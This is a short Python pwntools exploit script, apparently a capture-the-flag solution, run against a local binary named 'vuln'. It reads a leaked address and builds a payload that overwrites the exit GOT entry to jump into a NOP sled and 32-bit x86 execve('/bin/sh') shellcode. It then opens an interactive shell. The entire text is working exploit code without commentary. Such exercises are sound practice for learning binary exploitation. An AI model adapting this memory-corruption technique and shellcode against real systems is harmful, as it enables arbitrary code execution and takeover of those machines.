from pwn import *

r = process(['./vuln', 'test'])

leak = int(r.recvuntil('useful...').splitlines()[1])
exit_got = 0x804d02c

shellcode = "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"

payload = ""
payload += p32(exit_got - 12)
payload += p32(leak + 0x8)
payload += "\x90"*20
payload += shellcode

r.sendline(payload)
r.interactive()
